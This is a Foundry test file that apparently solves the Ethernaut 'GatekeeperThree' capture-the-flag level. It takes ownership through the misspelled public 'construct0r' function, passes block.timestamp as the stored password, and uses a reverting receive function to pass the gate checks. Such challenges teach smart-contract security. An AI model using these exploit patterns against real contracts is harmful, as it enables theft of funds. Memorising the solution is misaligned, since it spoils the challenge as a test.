// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {SimpleTrick,GatekeeperThree} from "src/GatekeeperThree.sol";

contract GatekeeperThree_POC is Test {
    SimpleTrick _simpleTrick;
    GatekeeperThree _gatekeeperThree;
    function init() private{
        vm.startPrank(address(0x10));
        _gatekeeperThree = new GatekeeperThree();
        _gatekeeperThree.createTrick();
        _simpleTrick=_gatekeeperThree.trick();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_GatekeeperThree_POC() public{
        payable(address(_gatekeeperThree)).send(0.01 ether);
        _gatekeeperThree.construct0r();
        _simpleTrick.checkPassword(block.timestamp);
        _gatekeeperThree.getAllowance(block.timestamp);
        _gatekeeperThree.enter();
        console.log("Success:",tx.origin==_gatekeeperThree.entrant());


    }
    receive() external payable {
        revert();
    }
        
}
